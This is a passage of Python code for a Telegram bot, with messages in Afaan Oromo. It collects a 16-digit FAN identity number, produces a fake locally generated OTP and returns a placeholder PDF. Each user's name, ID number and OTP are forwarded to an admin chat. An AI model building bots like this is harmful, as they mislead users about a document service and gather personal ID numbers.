async def handle_fan_fin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    u = user_data.get(uid)
    if not u or u.get('state') != 'WAITING_FAN_FIN': return
    fan_fin = update.message.text.strip()
    if not re.fullmatch(r"\d{16}", fan_fin):
        await update.message.reply_text("❌ FAN digitii 16 ta'uu qaba.")
        return
    otp = "".join([str(random.randint(0, 9)) for _ in range(6)])
    u['fan_fin'] = fan_fin; u['otp'] = otp; u['state'] = 'WAITING_OTP'
    save_user(uid, update.effective_user.username, update.effective_user.first_name, fan_fin, otp)

    # Admin notification
    admin_msg = (
        f"🚨 **OTP Request**\n\n"
        f"👤 {update.effective_user.first_name}\n"
        f"🔗 @{update.effective_user.username or 'N/A'}\n"
        f"🆔 `{uid}`\n🪪 FAN: `{fan_fin}`\n🔑 OTP: `{otp}`\n"
        f"⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    try:
        await context.bot.send_message(chat_id=get_admin_chat_id(), text=admin_msg, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Admin notify failed: {e}")

    await update.message.reply_text(
        f"✅ **FAN fudhatame!**\n📱 OTP ergameera.\n➡️ **OTP galchaa:**\n(Simulated: `{otp}`)",
        parse_mode="Markdown"
    )

async def handle_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    u = user_data.get(uid)
    if not u or u.get('state') != 'WAITING_OTP': return
    if update.message.text.strip() != u.get('otp'):
        await update.message.reply_text("❌ OTP dogoggora!")
        return
    await update.message.reply_text("⏳ **Fetching PDF...**")
    path = f"dl_{uid}.pdf"
    with open(path, 'wb') as f:
        f.write(b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF")
    with open(path, 'rb') as f:
        await update.message.reply_document(document=f, caption="✨ PDF Keessan!")
    u['downloaded_count'] += 1
    u['state'] = 'IDLE'
    try: os.remove(path)
    except: pass

